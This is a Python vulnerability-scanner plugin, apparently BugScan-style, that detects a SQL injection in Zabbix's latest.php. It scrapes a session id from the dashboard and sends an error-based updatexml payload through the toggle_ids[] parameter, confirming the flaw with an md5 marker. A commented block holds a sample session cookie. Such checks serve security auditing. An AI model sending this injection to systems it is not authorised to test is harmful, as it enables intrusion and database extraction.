#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re


def assign(service, arg):
    if service == fingerprint.zabbix:
        return True, arg


def audit(arg):
    payload = "/dashboard.php"

    # ##      本地测试 代码
    # ## 如果关闭了 Guest 就把此段打开，填上 Cookie 并把下一段注释掉
    # ##
    # headers = {
    #     'Cookie': 'PHPSESSID=u5slfsgo98kit40mb381cn0397; zbx_sessionid=433ae9eb61de2fc2ca2befa0dbed604a'
    # }
    # code, head, res, redir, log = hackhttp.http(arg + payload, headers=headers)
    # ##      本地测试结束
    # ##      线上代码
    # ## 线上会在创建扫描任务时由用户指定 Cookie 并注入进 hackhttp 中
    # ## 所以线上代码不需要在代码中指定 Cookie
    code, head, res, redir, log = hackhttp.http(arg + payload)
    # ##      线上代码结束
    if code == 200 and 'href="slides.php?sid=' in res:
        m = re.search(r'href="slides\.php\?sid=(.+?)">', res, re.M | re.I)
        if m:
            sid = m.group(1)
            payload = "latest.php?output=ajax&sid={sid}&favobj=toggle&toggle_open_state=1&toggle_ids[]=(select%20updatexml(1,concat(0x7e,(SELECT%20md5(537)),0x7e),1))".format(sid=sid)
            code, head, res, redir, log = hackhttp.http(arg + payload)
            if code == 200 and '5ea1649a31336092c05438df996a3e5' in res:
                security_hole(arg + payload, log=log)

if __name__ == '__main__':
    from dummy import *
    audit(assign(fingerprint.zabbix, 'http://localhost:8000/')[1])
